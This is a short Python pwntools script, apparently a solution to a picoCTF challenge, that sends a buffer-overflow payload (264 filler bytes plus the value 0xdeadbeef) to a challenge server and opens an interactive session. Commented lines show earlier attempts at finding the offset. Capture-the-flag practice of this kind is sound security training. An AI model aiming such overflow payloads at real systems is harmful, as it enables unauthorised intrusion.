import pwn
host = "mars.picoctf.net"
port = 31890
s = pwn.remote(host,port)
s.recvline()
s.recvline()
s.recvline()

# abc = "abcdefghijklmnopqrstuvwxyz"
# payload = abc.encode()
# for i in range(0, 265):
#     payload = payload + abc[i%26].encode()
# payload = b'A'*264 + pwn.p64(0xdeadbeef)
payload = b'A'*264 + b'\xef\xbe\xad\xde'

s.sendline(payload)
s.interactive()
s.close()